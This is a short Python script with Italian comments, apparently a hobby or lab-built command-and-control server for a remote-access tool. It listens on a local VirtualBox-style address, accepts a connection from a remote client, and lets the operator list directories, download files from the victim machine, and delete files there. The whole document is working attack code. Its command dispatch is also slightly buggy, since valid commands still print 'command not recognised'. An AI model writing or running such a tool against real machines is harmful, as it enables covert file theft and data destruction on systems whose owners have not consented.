import socket
import os

host='192.168.56.1'
port=8081
s=socket.socket()
s.bind((host, port))
s.listen()
print("\nin attesa di connessione...")
conn, address=s.accept()
print(f"{address} has connected")
print('connesso')
print('\ncommand list:\n\
    -view cwd: show all the file in the directory\n\
    -custom_dir: shows the files in the custom directory (selected one)\n\
    -copy_file: download files from directory\n\
    -remove_file: remove a file\n')


while True:
    command=str(input("\ncommand: "))
    if command=='view_cwd':
        conn.send(command.encode())
        print("\ncommand sent. waiting for execution...")
        files=conn.recv(4096)
        print("\nCommand executed successfully")
        files=files.decode()
        print("\ncommand output: ", files)
    
    if command =='custom_dir':
        conn.send(command.encode())
        print('\ncommand sent')
        custom_dir=str(input("\ncustom dir: "))
        conn.send(custom_dir.encode())
        print('\ncustom_dir sent')
        files=conn.recv(5000)
        print('\ncommand executed')
        files=files.decode()
        print("\ncommand output:", files)
    
    if command =='copy_file':
        conn.send(command.encode())
        print('\ncommand sent')
        filepath=str(input('\nenter the file path (w/ the file name and extension): '))
        conn.send(filepath.encode())
        print('\ncommand sent')
        file=conn.recv(100000)
        #file=file.decode() non si deve fare dato che ho usato rb
        filename=str(input("\nenter the file name, w the extension: "))
        new_file=open(filename, 'wb')
        new_file.write(file)
        new_file.close()
        print(f" {filename} dowloaded")
    
    if command =='remove_file':
        conn.send(command.encode())
        print('\ncommand sent')
        filepath=str(input('\ninput the path of the file including file name and extension: '))
        conn.send(filepath.encode())
        print('\nfile removed')
    
    else:
        print('command not recognised')